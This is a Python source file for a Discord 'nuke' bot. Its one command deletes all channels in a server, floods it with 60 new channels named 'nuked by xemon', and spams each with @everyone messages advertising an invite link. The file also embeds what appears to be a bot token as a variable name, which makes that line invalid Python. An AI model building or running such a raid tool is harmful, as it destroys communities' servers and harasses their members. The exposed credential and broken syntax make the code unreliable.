import discord
from discord.ext import commands
import asyncio
import os

MTM4ODg3NTI1NzgwNDM2MTk4OA.GzobP6.GZqF1rdpe-pCxuL59zYJDVoG2iLJKXRjj2MbWU = os.getenv("DISCORD TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!xemon", intents=intents)

荒らし文 = (
    "@everyone @here\n"
    "# Nuked by SYM\n"
    "# [今すぐ参加](https://discord.gg/snV9WUnX4h)\n"
    "# [GIF](https://imgur.com/NbBGFcf)\n"
    "# [GIF](https://imgur.com/pY7EpwN)"
)

@bot.event
async def on_ready():
    print(f"😂: {bot.user}")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await ctx.message.delete()

    print("対戦ありがとうございました")
    delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    print("チャンネル作成")
    new_channels = []
    for i in range(0, 60, 15):
        tasks = [
            asyncio.create_task(guild.create_text_channel("nuked by xemon"))
            for _ in range(15)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, discord.TextChannel):
                new_channels.append(r)
        await asyncio.sleep(1)  

    print(" スパムログ")
    async def spam(ch):
        for _ in range(60):
            try:
                await ch.send(荒らし文)
                await asyncio.sleep(0.5)
            except:
                await asyncio.sleep(2)

    await asyncio.gather(*(spam(ch) for ch in new_channels))
    print("✅ nuke完了ログ")

bot.run(MTM4ODg3NTI1NzgwNDM2MTk4OA.GzobP6.GZqF1rdpe-pCxuL59zYJDVoG2iLJKXRjj2MbWU)
